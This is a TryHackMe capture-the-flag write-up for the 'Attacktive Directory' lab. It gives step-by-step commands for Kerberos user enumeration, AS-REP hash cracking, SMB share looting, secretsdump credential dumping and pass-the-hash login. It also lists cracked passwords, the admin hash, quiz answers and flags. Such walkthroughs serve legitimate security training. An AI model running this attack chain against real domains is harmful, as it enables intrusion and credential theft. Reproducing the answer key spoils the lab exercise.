# Attacktive Directory Box Writeup
### Completed 23:22 29 DEC 21
### Donkeyk0ng787

#### BOX IP - 10.10.124.44

### Creds

	svc-admin:management2005
	backup@spookysec.local:backup2517860 

### Task 3 - Enumeration

	'Running a simple nmap scan
	nmap -sC -sV 10.10.124.44 -oN nmap/initial
	Gets us the domain spookysec.local'
	
	Question answers
	'enum4linux'
	'THM_AD'
	'.local'
	
### Task 4 - Enumerating Users via Kerberos

	'Using kerbrute to find the usernames using the following command
	./kerbrute_linux_386 userenum userlist.txt -d spookysec.local --dc spookysec.local
	This gets us a list of usernames'
	
	Question answers
	'userenum'
	'svc-admin'
	'backup'
	
### Task 5 - Abusing Kerberos

	'For this we use a script in impacket called GetNPUsers.py
	For this we use the following command to generate a file with the hashed password
	we can then put into hashcat.
	python3 GetNPUsers.py spookysec.local/ -dc-ip 10.10.124.44 -usersfile ~/THM/AttacktiveDirectory/usernames.txt -format hashcat -outputfile ~/THM/AttacktiveDirectory/hashes.txt
	From here we use the first part of the hash and match it to the hash type on the hashcat example wiki
	We see that it is Kerberos 5 AS-REP etype 23 which is mode number 18200
	We use the following hashcat command to crack the hash
	hashcat -m 18200 --force hashes.txt /usr/share/wordlists/rockyou.txt
	This gives us the password of
	management2005'
	
	Question answers
	'svc-admin'
	'Kerberos 5 AS-REP etype 23'
	'18200'
	'management2005'
	
### Task 6 - Enumeration - Back to Basic

	'Now that we have an account we can use smbclient to enumerate the shares using the command
	smbclient -L \\\\10.10.124.44 -U 'svc-admin'
	This lists for us the 6 shares on the spookysec.local domain
	We have access to a share in /backup which contains a txt file which contains an encoded string
	YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
	This is obviously base64 which we decode and get
	backup@spookysec.local:backup2517860'
	
	Question answers
	'smbclient'
	'-L'
	'6'
	'backup'
	'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw'
	'backup@spookysec.local:backup2517860 '
	
### Task 7 - Elevating Privileges in the Domain

	'Now that we have user credentials for the backup account of the domain controller, we can use another impacket tool
	secretsdump.py to retrieve all the password hashes that this user account has to offer. This will effectively give
	us full control over the AD domain.
	The usage of this tool is as follows
	python3 secretsdump.py spookysec.local/backup:backup2517860@10.10.124.44
	This gives us the hashed version of the administrator password among many other things
	Administrator hash is 0e0363213e37b94221497260b0bcb4fc'
	
	Question answers
	'DRSUAPI'
	'0e0363213e37b94221497260b0bcb4fc'
	'pass the hash'
	'-H'
	
### Task 8 - Flag Submission

	'Using evil-winrm we can access the server and collect the flags
	Usage is as follows
	evil-winrm -i 10.10.124.44 -u administrator -H 0e0363213e37b94221497260b0bcb4fc

	svc-admin flag
	'TryHackMe{K3rb3r0s_Pr3_4uth}'
	
	backup flag
	'TryHackMe{B4ckM3UpSc0tty!}'
	
	Administrator flag
	'TryHackMe{4ctiveD1rectoryM4st3r}'
	
	
	
	
	
	
	